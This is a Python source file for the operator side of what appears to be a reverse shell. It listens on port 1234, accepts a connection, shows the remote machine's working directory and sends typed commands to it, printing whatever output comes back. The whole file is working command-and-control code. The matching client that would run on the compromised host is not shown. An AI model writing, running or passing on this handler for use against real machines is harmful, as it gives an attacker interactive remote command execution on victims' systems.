import socket

host = "0.0.0.0"
port = 1234 # Change this if you want to use a different port
buffer_size = 1024 * 256  # 256KB max size of messages, feel free to increase
# separator string for sending 2 messages in one go
seperator = "<br>"

# Bind the socket to the IP address and listen
s = socket.socket()
s.bind((host, port))
s.listen(5)
print(f"Listening on {host}:{port} ...")

# Accept any connections attempted
client_socket, client_address = s.accept()
print(f"{client_address[0]}:{client_address[1]} Connected!")

# Receiving the current working directory of the client
cwd = client_socket.recv(buffer_size).decode()
print("Current working directory:", cwd)

while True:
    # Get the command from prompt
    command = input(f"{cwd} > ")
    if not command.strip():
        # Empty command
        continue
    # Send the command to the client
    client_socket.send(command.encode())
    if command.lower() == "exit":
        # If the command is exit, just break out of the loop
        break
    # Retrieve command results
    output = client_socket.recv(buffer_size).decode()
    # Split command output and current directory
    results, cwd = output.split(seperator)
    # Print output
    print(results)

s.close()
